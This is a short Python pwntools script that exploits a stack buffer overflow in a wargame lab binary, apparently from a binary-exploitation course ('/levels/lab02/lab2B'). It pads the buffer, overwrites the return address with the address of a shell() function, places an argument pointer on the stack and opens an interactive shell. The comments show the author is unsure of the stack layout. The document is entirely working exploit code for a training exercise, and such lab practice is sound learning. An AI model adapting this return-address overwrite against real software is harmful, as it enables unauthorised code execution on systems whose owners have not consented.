#!/usr/bin/python

import struct
import pwn

# we have a 15 byte buffer + 12 bytes of padding (idk if is this, but we have char pointer + ebp + something that i dont know what it is)
payload = "A" * 0x1b

# address of the first shell() instruction
payload += struct.pack('<I', 0x080486BD)

# overwriting the ebp? probably?
payload += "A" * 0x04

# in 32 bits, the argument of the function is called off from the stack, so we have to write it down the location of the string
payload += struct.pack('<I', 0x080497D0)

arguments = ["/levels/lab02/lab2B", payload]

p = pwn.process(argv=arguments)

p.interactive()

p.close()
